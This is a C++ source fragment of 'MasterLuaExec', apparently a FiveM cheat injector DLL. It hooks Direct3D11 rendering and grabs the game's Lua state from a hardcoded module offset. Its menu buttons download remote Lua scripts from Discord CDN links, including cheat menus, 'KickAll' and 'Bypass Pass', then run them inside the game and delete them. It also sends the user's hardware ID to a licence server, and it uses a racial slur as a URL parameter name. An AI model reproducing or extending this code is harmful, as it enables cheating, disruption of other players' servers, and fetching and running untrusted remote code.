		style->Colors[ImGuiCol_CheckMark] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		style->Colors[ImGuiCol_SliderGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		style->Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_Button] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		style->Colors[ImGuiCol_ButtonActive] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_Header] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_HeaderHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_HeaderActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_ResizeGrip] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		style->Colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_ResizeGripActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		style->Colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		style->Colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		style->Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		style->Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
		style->Colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);



		ImGui_ImplDX11_NewFrame();
		ImGui_ImplWin32_NewFrame();
		ImGui::NewFrame();
		static bool menu_show = true;
		static TextEditor		 editor;
		static TextEditor dump;
		static TextEditor ipeditor;
		static TextEditor porteditor;
		int r;
		r = rand() % 22;
		const char* tablica[23] = { "A", "B", "C", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "R", "S", "T", "U", "W", "X", "Y", "Z" };
		const char* losowa_litera = tablica[r];
		losowa_litera = 'C' + ':' + '/' + losowa_litera + '.' + 'l' + 'u' + 'a';
		string losowa_litera_string = losowa_litera;
		static bool checkbox1 = false;
		static bool checkbox2 = false;
		static bool checkbox3 = false;
		ImGui::Begin("MasterLuaExec V2.2"); 
		ImGui::SetWindowSize(ImVec2(882, 490), ImGuiCond_Always);
		ImGui::SetWindowFontScale(1.2);
		ImGui::Columns(2);

		ImGui::SetColumnOffset(1, 150);


		ImGui::NewLine();
		ImGui::NewLine();
		ImGui::NewLine();

		if (ImGui::Button(" Executor", ImVec2(120, 45)))
		{
			tabs = 1;
		}

		//if (ImGui::Button(" Dumper", ImVec2(120, 45)))
		//{
		//	tabs = 2;
		//}

		if (ImGui::Button(" Menus", ImVec2(120, 45)))
		{
			tabs = 3;
		}

		//if (ImGui::Button(" Fast Menu", ImVec2(120, 45)))
		//{
		//	tabs = 4;
		//}
		//if (ImGui::Button(" Resource list", ImVec2(120, 45)))
		//{
		//	tabs = 9;
		//}

		if (ImGui::Button(" Function", ImVec2(120, 45)))
		{
			tabs = 7;
		}


		ImGui::NewLine();
		ImGui::NewLine();
		ImGui::NewLine();
		ImGui::NewLine();
		ImGui::Text("");
		ImGui::Text("");
		ImGui::NewLine();

		ImGui::NextColumn();

		if (tabs == 0) {
			ImGui::NewLine();
			ImGui::NewLine();
			ImGui::NewLine();
			ImGui::NewLine();
			ImGui::NewLine();
			ImGui::NewLine();
			ImGui::Text("");
			ImGui::Text("");
		}

		if (tabs == 1) {
			string resourcestopname;
			static char resourcenamestop[128] = "";
			ImGui::Text("");
			ImGui::SameLine();
			ImGui::Text("");
			ImGui::SameLine();
			ImGui::NewLine();
			editor.SetLanguageDefinition(TextEditor::LanguageDefinition::Lua());
			editor.SetShowWhitespaces(false);
			editor.SetPalette(TextEditor::GetRedEnginePalette());
			editor.SetReadOnly(false);

			dump.SetLanguageDefinition(TextEditor::LanguageDefinition::Lua());
			dump.SetShowWhitespaces(false);
			dump.SetPalette(TextEditor::GetRedEnginePalette());
			dump.SetReadOnly(true);
			ImGui::Indent();
			editor.Render("TextEditor", ImVec2(650, 336), true); ImGui::Spacing();
			ImGui::Indent();
			ImGui::Indent();
			ImGui::Indent();
			ImGui::Indent();
			ImGui::Indent();

			if (ImGui::Button("Execute Code", ImVec2(120, 35)))
			{
				string path_to_exec = cCurrentPath;
				path_to_exec += LuaFileName();
				CreateFileAndExecute(editor.GetText(), path_to_exec);
			};
			ImGui::SameLine();
			if (ImGui::Button("Open File", ImVec2(120, 35)))
			{
				ImGuiFileDialog::Instance()->OpenDialog("fileKey", "Choose File", ".lua\0\0", ".");
			}
			ImGui::SameLine();
			if (ImGui::Button("Clear", ImVec2(120, 35)))
			{
				editor.SetText("");
			}
			ImGui::SameLine();

			if (ImGuiFileDialog::Instance()->FileDialog("fileKey"))
			{
				if (ImGuiFileDialog::Instance()->IsOk == true)
				{
					std::fstream file;
					std::string filedata, data;

					std::string filePath = ImGuiFileDialog::Instance()->GetFilepathName();

					LoadSystemFile(grabbedInstance, filePath.c_str());
				}
				ImGuiFileDialog::Instance()->CloseDialog("fileKey");
			}

		}
		if (tabs == 2) {
		}
		if (tabs == 3) {
			ImGui::TextColored(ImVec4(2.55f, 2.55f, 2.55f, 2.0f), "__________________________________________________________________________________________________");
			ImGui::Text("								   Choose menu");
			ImGui::Text("");
			ImGui::Text("   Dopamine");
			ImGui::SameLine();
			ImGui::Text("	 LokiMenu");
			ImGui::SameLine();
			ImGui::Text("	 Absolute");

			if (ImGui::Button("Inject Dopa", ImVec2(110, 25))) {
				string dwnld_URL = "https://cdn.discordapp.com/attachments/742873589350531192/751113278016585748/dopamine.lua";
				string savepath = "C:\\Users\\Public\\dopa.lua";
				URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
				LoadSystemFile(grabbedInstance, "C:\\Users\\Public\\dopa.lua");
				system("del C:\\Users\\Public\\dopa.lua");

			}
			ImGui::SameLine();
			if (ImGui::Button("Inject Loki", ImVec2(110, 25))) {
				string dwnld_URL2 = "https://cdn.discordapp.com/attachments/743819577019858975/743853760673087528/LokiMenu.lua";
				string savepath2 = "C:\\Users\\Public\\loki.lua";
				URLDownloadToFile(NULL, dwnld_URL2.c_str(), savepath2.c_str(), 0, NULL);
				LoadSystemFile(grabbedInstance, "C:\\Users\\Public\\loki.lua");
				system("del C:\\Users\\Public\\loki.lua");
			}
			ImGui::SameLine();
			if (ImGui::Button("Inject Abso", ImVec2(110, 25))) {
				string dwnld_URL3 = "https://cdn.discordapp.com/attachments/745385699754246216/751103124214775808/Absolute.lua";
				string savepath3 = "C:\\Users\\Public\\abso.lua";
				URLDownloadToFile(NULL, dwnld_URL3.c_str(), savepath3.c_str(), 0, NULL);
				LoadSystemFile(grabbedInstance, "C:\\Users\\Public\\abso.lua");
				system("del C:\\Users\\Public\\abso.lua");
			}
			ImGui::TextColored(ImVec4(2.55f, 2.55f, 2.55f, 2.0f), "__________________________________________________________________________________________________");
			ImGui::Text("								   Premium menu");
			static void(*ShowPopup)() = []() {};
			if (ImGui::Button("Inject M1000", ImVec2(110, 25))) {

				string hostfile = "http://dev.masterlua.com:8189/covid19/masterlua/menu?chingchong=";
				string hwid = a_gethid();
				string result = a_DownloadURL(hostfile + hwid);
				if (result == "hvWMd1iJ4QA13M3IO5VxrDET4ARUiG85Bhq2XXtOyMi9HXQ82I5lldnfCCzZbsC") {
					ImGui::OpenPopup("A");
					string dwnld_URL3 = GetNewLuaMenuLink();
					string okkkk = random_string(11, "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ") + ".lua";
					string location = "C:\\Users\\Public\\" + okkkk;
					string del = "del " + location;
					URLDownloadToFile(NULL, dwnld_URL3.c_str(), location.c_str(), 0, NULL);
					LoadSystemFile(grabbedInstance, location.c_str());
					system(del.c_str());

				}
				else {
					ImGui::OpenPopup("B");
				}
			}
			if (ImGui::BeginPopupModal("A", NULL)) {
				ImGui::Text("M1000 MENU INJECTED , Thank you for your purchase , Enjoy .\n");
				if (ImGui::Button("Ok , Thanks MasterLua The Best <3"))
				{
					ImGui::CloseCurrentPopup();
					ShowPopup = []() {};
				}
				ImGui::EndPopup();
			}
			if (ImGui::BeginPopupModal("B", NULL)) {
				string phrase = "You dont have lisence for M1000 menu you need buy it";
				ImGui::Text(phrase.c_str());
				if (ImGui::Button("Ok , Thanks MasterLua The Best <3"))
				{
					ImGui::CloseCurrentPopup();
					ShowPopup = []() {};
				}
				ImGui::EndPopup();
			}
		}
		if (tabs == 7) {
			ImGui::TextColored(ImVec4(2.55f, 2.55f, 2.55f, 2.0f), "__________________________________________________________________________________________________");
			ImGui::Text("								Choose Function");
			ImGui::Text("");
			if (ImGui::Button("KickAll", ImVec2(110, 25))) {
				string dwnld_UR4 = "https://cdn.discordapp.com/attachments/743528906182885508/751147635452411956/kickall.lua";
				string savepath4 = "C:\\Users\\Public\\kick.lua";
				URLDownloadToFile(NULL, dwnld_UR4.c_str(), savepath4.c_str(), 0, NULL);
				LoadSystemFile(grabbedInstance, "C:\\Users\\Public\\kick.lua");
				system("del C:\\Users\\Public\\kick.lua");

			}
			ImGui::SameLine();
			if (ImGui::Button("Bypass Pass", ImVec2(110, 25))) {
				string dwnld_URL5 = "https://cdn.discordapp.com/attachments/743528906182885508/751147604208779357/bypasspass.lua";
				string savepath5 = "C:\\Users\\Public\\pass.lua";
				URLDownloadToFile(NULL, dwnld_URL5.c_str(), savepath5.c_str(), 0, NULL);
				LoadSystemFile(grabbedInstance, "C:\\Users\\Public\\pass.lua");
				system("del C:\\Users\\Public\\pass.lua");
			}
			ImGui::SameLine();

		}
		if (tabs == 5) {
			if (ImGui::Button("UNHOOK"))
			{
				kiero::shutdown();
				return 0;
			};
		}

		ImGui::End();

		ImGui::Render();

		pContext->OMSetRenderTargets(1, &mainRenderTargetView, NULL);
		ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
	}
	return oPresent(pSwapChain, SyncInterval, Flags);
}

DWORD WINAPI MainThread(LPVOID lpReserved)
{
	bool init_hook = false;
	do
	{
		if (kiero::init(kiero::RenderType::D3D11) == kiero::Status::Success)
		{
			kiero::bind(8, (void**)&oPresent, hkPresent);
			init_hook = true;
		}
	} while (!init_hook);
	return TRUE;
}

void ok()
{
	string hostfile = "http://dev.masterlua.com:8189/covid19/masterlua/exec?chingchong=";
	string hwid = a_gethid();
	string result = a_DownloadURL(hostfile + hwid);
	if (result == "P6RdBml8SzgltZYZ") {
	}
	else {
		MessageBoxA(NULL, "AntiCrack Activate , Restart exec and FiveM", "MasterLuaExec", NULL);
		Sleep(999999999999999);
	}
}


BOOL WINAPI DllMain(HMODULE hMod, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:

		DisableThreadLibraryCalls(hMod);
		CreateThread(nullptr, 0, MainThread, hMod, 0, nullptr);
		std::thread([&] {
			while (!csLuaBase)
				csLuaBase = CustomAPI::GetModuleA("citizen-scripting-lua");

			for (;;) {
				uint64_t* c1 = (uint64_t*)(csLuaBase + 0x63CF80);
				if (*c1 != 0)
					grabbedInstance = *c1;

				std::this_thread::sleep_for(std::chrono::milliseconds(250));
			}
			}).detach();
			break;
	case DLL_PROCESS_DETACH:
		kiero::shutdown();
		break;
	}

	return TRUE;
}